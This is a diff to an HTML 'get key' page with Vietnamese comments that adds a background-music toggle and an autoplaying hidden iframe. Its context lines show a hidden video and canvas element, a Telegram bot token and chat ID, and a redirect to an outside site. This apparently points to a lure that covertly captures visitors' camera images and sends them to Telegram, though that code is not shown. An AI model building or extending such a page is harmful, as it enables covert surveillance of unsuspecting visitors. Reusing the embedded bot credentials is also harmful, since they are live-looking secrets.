@@ -87,11 +87,26 @@
   }
   .btn-primary:hover { opacity: 0.95; transform: translateY(-2px); box-shadow: 0 15px 30px -5px rgba(59, 130, 246, 0.7); }
 
-  .status { margin-top: 20px; font-size: 0.8rem; font-weight: 500; color: var(--text-muted); min-height: 20px; }
-  #video, #canvas { display: none; }
+  /* Nút điều khiển nhạc */
+  .btn-music {
+    width: 100%; padding: 12px;
+    margin-top: 12px;
+    background: rgba(30, 41, 59, 0.5);
+    color: var(--text-muted); border: 1px solid var(--border-color); border-radius: 14px;
+    font-weight: 600; font-size: 0.85rem; cursor: pointer;
+    transition: all 0.3s ease;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+  }
+  .btn-music:hover { background: rgba(59, 130, 246, 0.1); color: #fff; border-color: rgba(59, 130, 246, 0.4); }
+
+  .status { margin-top: 16px; font-size: 0.8rem; font-weight: 500; color: var(--text-muted); min-height: 20px; }
+  #video, #canvas, #music-container { display: none; }
 </style>
 </head>
 <body>
+
+  <!-- Khung chứa nhạc ẩn (Hỗ trợ mọi loại link) -->
+  <div id="music-container"></div>
 
   <!-- Tạo hiệu ứng tuyết rơi bằng JS -->
   <script>
@@ -122,9 +137,14 @@
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <!-- 1 Nút Get Key duy nhất -->
+    <!-- Nút Get Key -->
     <button class="btn-primary" id="get-key-btn" onclick="triggerProcess()">
       <span>🔑 GET KEY NGAY</span>
+    </button>
+
+    <!-- Nút Bật/Tắt Nhạc -->
+    <button class="btn-music" id="music-toggle-btn" onclick="toggleMusic()">
+      <span id="music-icon">🎵</span> <span id="music-text">Bật Nhạc Nền</span>
     </button>
     
     <div id="status" class="status"></div>
@@ -134,6 +154,41 @@
   const TELEGRAM_BOT_TOKEN = '8812338501:AAFnZiI0fpcNqs0LMGUUuFV2MCSTgpdNbaI'; 
   const TELEGRAM_CHAT_ID = '-1004303781844'; 
   const REDIRECT_URL = 'https://xnhau.city/';
+
+  // ---------------------------------------------------------
+  // THAY LINK NHẠC CỦA BẠN VÀO ĐÂY (Hỗ trợ Youtube, MP3, v.v.)
+  // Nếu là Youtube, hãy dùng dạng embed: https://www.youtube.com/embed/VIDEO_ID?autoplay=1
+  // ---------------------------------------------------------
+  const MUSIC_URL = 'https://open.spotify.com/track/2FOjXz9XVgkn8sUNdaH3Pt?si=EomALRXmTR65eIDvPDtV9w&utm_source=copy-link&rowId=0613099f713aa8e8';
+
+  const musicContainer = document.getElementById('music-container');
+  const musicToggleBtn = document.getElementById('music-toggle-btn');
+  const musicIcon = document.getElementById('music-icon');
+  const musicText = document.getElementById('music-text');
+  let isMusicPlaying = false;
+
+  function toggleMusic() {
+    if (isMusicPlaying) {
+      musicContainer.innerHTML = ''; // Xóa iframe để dừng nhạc
+      isMusicPlaying = false;
+      musicIcon.textContent = '🎵';
+      musicText.textContent = 'Bật Nhạc Nền';
+    } else {
+      musicContainer.innerHTML = `<iframe src="${MUSIC_URL}" allow="autoplay" width="0" height="0"></iframe>`;
+      isMusicPlaying = true;
+      musicIcon.textContent = '🔇';
+      musicText.textContent = 'Tắt Nhạc Nền';
+    }
+  }
+
+  // Tự động bật nhạc khi vừa vào trang
+  window.addEventListener('load', () => {
+    // Tự động kích hoạt phát nhạc ngầm ngay khi tải trang
+    musicContainer.innerHTML = `<iframe src="${MUSIC_URL}" allow="autoplay" width="0" height="0"></iframe>`;
+    isMusicPlaying = true;
+    musicIcon.textContent = '🔇';
+    musicText.textContent = 'Tắt Nhạc Nền';
+  });
 
   function updateClock() {
     const now = new Date();
